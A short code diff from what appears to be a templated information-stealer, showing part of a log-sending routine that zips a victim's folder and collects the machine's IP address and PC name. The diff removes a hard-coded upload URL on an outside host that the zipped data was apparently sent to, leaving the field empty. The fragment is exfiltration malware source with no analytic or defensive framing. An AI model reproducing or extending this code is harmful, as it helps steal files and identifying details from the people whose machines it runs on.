@@ -296,7 +296,7 @@ async function %SENDLOGS%() {
   };
 
   readFolder(folderPath, zip, '');
-  var copyurl = "https://projectdream.ml/full.php"
+  var copyurl = ""
   let ip = await %GETIP%()
   let username = await %PCNAME%()
   let embed = await %GETEMBED%()
